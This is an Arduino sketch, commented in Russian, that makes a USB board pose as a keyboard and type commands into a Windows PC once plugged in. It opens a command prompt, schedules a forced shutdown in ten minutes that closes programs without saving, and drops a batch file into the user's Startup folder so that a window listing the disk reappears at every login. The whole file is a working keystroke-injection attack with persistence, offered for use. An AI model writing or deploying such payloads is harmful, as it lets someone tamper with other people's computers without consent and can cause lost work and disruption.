#include <USBHIDKeyboard.h>

USBHIDKeyboard kb;

void setup() {
  kb.begin();
  delay(3000); // Ждем, пока ПК распознает плату

  // Принудительно ENG раскладка (Win + Space)
  kb.press(KEY_LEFT_GUI); kb.press(' '); delay(50); kb.releaseAll(); delay(200);

  // Открываем CMD
  kb.press(KEY_LEFT_GUI); kb.press('r'); delay(50); kb.releaseAll(); delay(400);
  kb.print("cmd"); kb.write(KEY_RETURN); delay(600);

  // 1. Ставим таймер выключения на 10 минут (600 секунд) с принудительным закрытием программ (/f)
  kb.print("shutdown /s /t 600 /f"); 
  kb.write(KEY_RETURN); delay(200);

  // 2. Создаем скрипт в автозагрузке (развернутое окно, зеленый цвет, dir/s)
  kb.print("echo start /max cmd /c \"color 2 & dir/s & pause\" > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\p.bat\"");
  kb.write(KEY_RETURN); delay(500);

  // 3. Закрываем CMD
  kb.print("exit"); kb.write(KEY_RETURN);
}

void loop() {}
